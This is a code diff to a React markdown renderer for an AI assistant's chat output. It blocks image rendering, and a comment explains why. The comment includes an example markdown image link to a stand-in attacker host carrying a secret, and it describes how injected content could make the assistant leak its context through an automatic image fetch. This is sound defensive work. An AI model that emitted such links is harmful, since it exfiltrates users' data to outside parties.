@@ -25,6 +25,21 @@ function extractLanguage(className?: string): string {
 }
 
 const INITIAL_COMPONENTS: Partial<Components> = {
+  // Images are DROPPED, not rendered. This is a security control, not a
+  // styling choice.
+  //
+  // `![](https://attacker.com/?k=SECRET)` renders a real <img>, and the browser
+  // fetches it immediately with no click — so anything that reaches the model's
+  // context can be exfiltrated in a single markdown token. The assistant has no
+  // legitimate reason to emit an image, so the whole class of attack is removed
+  // by never rendering one.
+  //
+  // Raw HTML is already inert (react-markdown needs rehype-raw for that, which
+  // is deliberately absent) and javascript: URLs are stripped by its default
+  // urlTransform. Markdown image syntax was the remaining hole.
+  img: function BlockedImage() {
+    return null
+  },
   code: function CodeComponent({ className, children, ...props }) {
     const isInline =
       !props.node?.position?.start.line ||
